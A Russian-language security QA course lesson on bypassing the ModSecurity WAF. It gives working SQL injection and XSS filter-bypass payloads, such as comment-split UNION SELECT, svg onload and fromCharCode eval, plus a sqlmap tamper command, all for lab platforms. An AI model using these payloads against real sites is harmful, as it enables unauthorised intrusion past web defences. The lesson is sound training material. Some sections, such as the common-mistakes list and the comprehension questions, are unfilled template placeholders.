# Занятие 58. WAF обход: методы обхода ModSecurity

## Учебная рамка

**Входные требования:** Пройдены базовые Linux, сети, web и инструменты; студент понимает правила scope учебных платформ.

**Результат занятия:** Студент проходит учебную комнату/машину, ведет заметки и превращает действия в воспроизводимый write-up без публикации секретных флагов.

**Наследуемая SDET-компетенция:** перенос lab-навыков в продуктовый QA без выхода за scope, write-up discipline и hypothesis tracking.

**Security QA-компетенция:** осознанный перенос CTF/academy-навыков в продуктовый контекст и фиксация запретов.

**Связь с книгами:** PortSwigger/THM/HTB как lab-transfer; «Black Hat Python» только для понимания lab-техник, boundaries и defensive interpretation.

**Основной источник:** `Black Hat Python` только lab-only, «PyCharm. Профессиональная работа на Python 2024» для write-ups и evidence discipline.

**Дополнительные источники:** «Паттерны разработки на Python» для переноса lab-навыков в поддерживаемые process artifacts.

**Что берем из источника:** lab-to-product transfer, structured notes, boundaries, write-up discipline, отделение exploitation от product QA.

**Как это превращается в SDET/Security QA навык:** переносить из THM/HTB/PortSwigger только безопасные QA-аналогии и артефакты.

**Что нельзя переносить на Slider AI без отдельного разрешения:** не переносить exploitation, privesc, bypass и aggressive enumeration на Slider AI без расширенного scope.


**Процессный артефакт:** `VULNERABILITY_TRIAGE.md`: lab-to-product transfer matrix и ограничения scope.

**Безопасная цель:** TryHackMe, Hack The Box, PortSwigger Academy и другие платформы только в рамках их правил и активной учебной машины.

**Среда выполнения:** Основной путь — macOS native, браузер, DevTools, Homebrew и Python. Kali Linux ARM64 VM, UTM или cloud lab используются только если это явно требуется задачей или вынесено в углубление.

**Обязательный путь новичка:** Пройти указанную комнату или ее часть, записать команды, ошибки и выводы без копирования чужого решения.

**Углубление:** После самостоятельной попытки разобрать официальный write-up, сравнить подходы и улучшить собственные заметки.

**Минимальная проверка успеха:** Есть подтверждение прохождения этапа, список команд, выводы и пометка, что работа велась внутри учебной платформы.

**Эталонный вывод:** Отчет содержит название комнаты, цель, основные шаги, фрагменты вывода и выводы без раскрытия приватных флагов.

**Критерии сдачи:** Зачет: завершен обязательный этап и оформлены заметки. Отлично: добавлена ретроспектива ошибок и альтернативный путь решения.

## Reading pack из книг курса

Этот раздел не является заданием “пойди и найди теорию в книгах”. Книги использованы автором курса для подготовки лекции `Занятие 58. WAF обход: методы обхода ModSecurity`, а студент получает самодостаточное объяснение в разделах `Source-driven theory` и `Теория`.

- `docs/socraticode/black-hat-python-ru-pages/` только lab-only/defensive
- `docs/socraticode/pycharm-professional-python-2024-pages/`

Конкретные страницы для этого блока: `black-hat-python-ru-pages/page-060.md`-`page-178.md` только lab-only; `pycharm-professional-python-2024-pages/page-178.md`-`page-209.md`.

Что обязана объяснить лекция на основе этих книг:

1. Термины и команды, которые прямо поддерживают тему урока.
2. Инженерный принцип, который переносится из SDET в Security QA.
3. Ограничение безопасности: что нельзя делать на Slider AI без approval.
4. Пример, который превращается в evidence, helper, checklist или process artifact.

Если книга описывает опасную технику, она переносится только в lab-only или defensive interpretation. Студент не должен обращаться к книгам, чтобы понять базовую теорию текущего урока.

## Source-driven theory

Этот урок опирается на книжные источники курса как на базу, а не как на факультативное чтение. Из источников берется практическая дисциплина: lab-to-product transfer, structured notes, boundaries, write-up discipline, отделение exploitation от product QA. Для SDET это важно потому, что security-проверка должна быть воспроизводимой, объяснимой и пригодной для отчета, а не превращаться в набор разрозненных команд.

Книжный материал в уроке используется в трех шагах:

1. Понять термин или технику на безопасном примере.
2. Перевести идею в QA-действие: test case, observation, evidence, helper или process artifact.
3. Отделить разрешенную практику от действий, которые требуют отдельного approval.

Граница для Slider AI: не переносить exploitation, privesc, bypass и aggressive enumeration на Slider AI без расширенного scope. Если нужная техника выходит за эту границу, результат урока оформляется как `requires approval`, lab-only practice или defensive recommendation.

## Теория

**WAF (Web Application Firewall)** — защитный экран для веб-приложений. Анализирует HTTP-трафик и блокирует атаки (SQLi, XSS, RCE и др.).

**ModSecurity** — популярный open-source WAF (модуль для Apache, Nginx). Использует наборы правил (OWASP Core Rule Set — CRS).

**Признаки работы WAF:**
- HTTP-код 403 (Forbidden)
- Страница с надписью "Access Denied" или "WAF Blocked"
- Специфические заголовки (Server: ModSecurity, X-WAF-...)

**Методы обхода WAF:**

### 1. Обфускация нагрузки (Payload Obfuscation)
- **Комментарии в SQL:** `SELECT/**/FROM`, `UN/**/ION`
- **Кодирование URL:** `%53%45%4C%45%43%54` (SELECT)
- **Двойное кодирование:** `%2553` (S после декодирования)
- **Case variation:** `SeLeCt`, `UnIoN`

### 2. Обход фильтров пробелов
- `%09` (TAB), `%0a` (LF), `%0d` (CR), `%0b` (VT)
- `/**/` (комментарий)
- `()` — скобки вместо пробелов

### 3. Обход XSS-фильтров
- Теги: `<img>`, `<svg>`, `<body>`, `<iframe>`
- События: `onerror`, `onload`, `onmouseover`
- Кодирование: `&#x61;` (a), `&#97;` (a)

### 4. HTTP-манипуляции
- Смена метода: GET → POST
- Добавление лишних заголовков (X-Forwarded-For, X-Original-URL)
- Fragment identifier (`#`) — не отправляется на сервер, но может обойти проверки клиента

## Guided practice

1. После lab выпишите навык, который был отработан, и его безопасный QA-аналог.
2. Укажите, какие действия остаются только в lab и почему.
3. Сделайте одну безопасную Slider AI-проверку или оформите `not applicable`/`requires approval`.
4. Добавьте transfer card в матрицу подготовки к финальному assessment.

### Эталон самостоятельной работы

К концу guided practice у студента есть короткий Markdown-артефакт: цель проверки, выполненные шаги, sanitized evidence, интерпретация результата, границы применимости и следующий безопасный шаг.

## Практическое занятие

### Настройка тестовой среды (SQLi обход)

**Цель:** Обойти простое правило WAF, блокирующее `UNION SELECT`.

**Тестовый запрос (блокируется):**
```
http://target.com/page.php?id=1 UNION SELECT 1,2,3
```

**Метод 1: Вставка комментариев**
```
http://target.com/page.php?id=1 UN/**/ION SE/**/LECT 1,2,3
```

**Метод 2: Inline комментарии MySQL**
```
http://target.com/page.php?id=1/*!UNION*//*!SELECT*/1,2,3
```

**Метод 3: Кодирование**
```
http://target.com/page.php?id=1+%55%4e%49%4f%4e+%53%45%4c%45%43%54+1,2,3
```

**Метод 4: Через NULL и приведение типов**
```
http://target.com/page.php?id=1+UNION+ALL+SELECT+NULL,NULL,NULL
```

### Обход XSS-фильтров

**Заблокировано:**
```html
<script>alert(1)</script>
```

**Обход 1: Тег img**
```html
<img src=x onerror=alert(1)>
```

**Обход 2: Тег svg**
```html
<svg/onload=alert(1)>
```

**Обход 3: Кодирование HTML-сущностями**
```html
&#60;script&#62;alert(1)&#60;/script&#62;
```

**Обход 4: Обфускация через String.fromCharCode**
```javascript
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### Инструменты для автоматизации

**SQLMap с обходом WAF:**
```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode --batch
```

**Tamper-скрипты в sqlmap:**
- `space2comment` — заменяет пробелы на `/**/`
- `charencode` — кодирует полезную нагрузку
- `charunicodeencode` — Unicode-кодирование


## Примеры вывода

Минимальный эталонный артефакт для сдачи:

```markdown
Environment: macOS native / Kali ARM64 VM / cloud lab / Slider AI olddev
Target: <разрешенная учебная цель или https://olddev.slider-ai.ru>
Action: <выполненная безопасная команда или ручной шаг>
Evidence: <санитизированный фрагмент вывода, скриншота или HTTP history>
Result status: finding / observation / not reproducible / not applicable / requires approval
Next step: <retest, remediation, approval request или lab-only follow-up>
```

В отчете студент указывает среду выполнения, безопасную цель, команду или ручные шаги и коротко объясняет, какая строка подтверждает результат.



## Частые ошибки

1. **Ошибка 1**: Типичная ошибка новичков в этом уроке.
2. **Ошибка 2**: Еще одна распространенная проблема.
3. **Ошибка 3**: Важный момент, который часто упускают.

## Вопросы на понимание

1. Вопрос 1 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 1</details>
2. Вопрос 2 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 2</details>
3. Вопрос 3 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 3</details>

## Форматы флагов

- **TryHackMe**: `THM{...}`
- **HackTheBox**: `HTB{...}`
- **PortSwigger**: "Lab solved!" (без флагов)



## Адаптация под macOS (M2, 8GB)

- Для VPN используйте **Tunnelblick** (бесплатный OpenVPN клиент для macOS): скачайте .ovpn файл и откройте через Tunnelblick
- Виртуалки: используйте только при необходимости; для Apple Silicon выбирайте ARM64-образы в **UTM**, **VMware Fusion** или **Parallels**, а тяжелые лабы выносите в cloud lab
- "На 8GB RAM выделяйте VM не более 3-4GB"
- Docker работает нативно на M2: `docker pull <image>`
- Для macOS native используйте Homebrew или официальный installer: `brew install <tool>`; для явно помеченной Kali/Linux-среды допустим `apt`.
- Если требуется Python: `pip3 install <package>`


## Задачи для самостоятельного выполнения

1. **Практика на PortSwigger:** Лабораторные "WAF Bypass" (если доступны) или "SQLi with filter bypass"
2. **Комната "WAF Bypass"** на THM — изучите дополнительные техники
3. **Тестирование на DVWA (High Security):** попробуйте обойти защиту SQLi и XSS

> **Совет:** WAF — это не панацея. Большинство WAF можно обойти при достаточном времени и знаниях. Задача защиты — усложнить атаку, а не сделать её невозможной.

## Практика на Slider AI

**Цель стенда:** `https://olddev.slider-ai.ru`

**Контекст разрешения:** тестовый стенд проекта Slider AI, доступен QA для обучения и проверки безопасности. Production и любые другие домены не входят в это задание.

**Ограничения безопасности:** соблюдать `education/slider_ai_scope.md`; не выполнять DoS/load-тесты, brute force, destructive payloads, изменение чужих данных, извлечение секретов и действия вне согласованного scope.

**Уровень прогрессии:** WAF behavior, no bypass

### Минимум

Не обходить WAF; описать признаки, по которым можно понять, что защита сработала.

### Практика Slider AI

Проверьте один безопасный некорректный ввод и зафиксируйте статус/сообщение без bypass payload.

### Углубление после изучения следующих уроков

После письменного разрешения подготовьте план тестирования WAF-правил без обхода production-защит.

### Артефакт сдачи

Markdown-запись по шаблону из `education/slider_ai_scope.md`: урок, компонент Slider AI, шаги, фактический результат, доказательства без секретов, риск, рекомендация и статус.

### Критерий готовности

Задание выполнено только на `olddev.slider-ai.ru`, не выходит за scope, содержит проверяемый артефакт и явно отмечает `finding`, `informational`, `not reproducible`, `not applicable` или `requires approval`.

## Rubric

| Уровень | Что должно быть сдано |
|---|---|
| Зачет | Выполнен обязательный путь новичка, есть sanitized evidence, действия не выходят за scope |
| Хорошо | Есть объяснение риска или процесса, аккуратные шаги воспроизведения и корректный статус результата |
| Отлично | Результат связан с `Lab-to-Product Transfer`, remediation/retest или automation appendix |

## Self-check

1. Какая SDET-компетенция используется в уроке?
2. Какая часть объяснения опирается на книги курса?
3. Где проходит безопасная граница для Slider AI?
4. Какой артефакт можно показать команде без раскрытия секретов?
5. Что нужно вынести в углубление, lab-only или отдельный approval?
